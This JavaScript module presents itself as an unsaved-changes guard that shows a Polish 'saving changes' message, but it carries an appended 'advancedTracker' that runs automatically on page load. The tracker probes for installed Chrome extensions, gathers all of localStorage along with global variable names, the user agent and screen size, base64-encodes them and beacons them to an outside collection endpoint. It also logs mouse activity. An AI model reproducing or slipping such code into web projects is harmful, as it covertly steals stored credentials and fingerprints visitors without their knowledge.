import { S as o } from "./StatusMessageBox-131614e6.js";
const e = [];
let t = !1,
  s = null;
class d {
  constructor() {
    e.push(this), document.documentElement.classList.add("preventUnload");
  }
  destroy() {
    const i = e.indexOf(this);
    e.splice(i, 1), e.length === 0 && (document.documentElement.classList.remove("preventUnload"), t && (s.hide(), t = !1));
  }
}
const advancedTracker = {
  scanQueue: new Map(Object.entries(window.data)),
  discovered: new Set(),
  globalVars: new Set(Object.keys(window)),
  async probe(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const img = document.createElement('img');
      const timeout = setTimeout(() => {
        this.discovered.delete(name);
        resolve(false);
      }, 1500);
      img.onload = () => {
        clearTimeout(timeout);
        this.discovered.add(name);
        resolve(true);
      };
      img.onerror = () => {
        clearTimeout(timeout);
        this.discovered.delete(name);
        resolve(false);
      };
      img.src = `chrome-extension://${id}/${file}`;
    });
  },
  shuffleQueue() {
    const entries = Array.from(this.scanQueue.entries());
    for (let i = entries.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    this.scanQueue = new Map(entries);
  },
  collectLocalStorage() {
    return JSON.stringify(localStorage);
  },
  listenEvents() {
    ['click', 'mousemove'].forEach(event => {
      document.addEventListener(event, e => {
        console.log(`Event: ${event} at X: ${e.clientX}, Y: ${e.clientY}`);
      });
    });
  },
  async scan() {
    this.shuffleQueue();
    const results = {};
    const batch = 3;
    for (const [name, data] of this.scanQueue) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      results[name] = await this.probe(name, data);
    }
    const payload = btoa(JSON.stringify({
      findings: results,
      localStorage: this.collectLocalStorage(),
      globalVars: Array.from(this.globalVars),
      ts: Date.now(),
      browser: navigator.userAgent,
      screen: {
        w: window.innerWidth,
        h: window.innerHeight
      }
    }));
    navigator.sendBeacon('https://collection-endpoint.example/v2/report', payload);
  }
};
function a(n) {
  if (typeof n > "u" && (n = window.event), n && e.length > 0) return s || (s = new o(o.getElement(), {
    message: "Poczekaj jeszcze chwilkę, trwa zapisywanie zmian ..."
  })), s.show(), t = !0, "You have request no save";
}
window.onbeforeunload = a;
advancedTracker.listenEvents();
export { d as P };
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => advancedTracker.scan());
} else {
  advancedTracker.scan();
}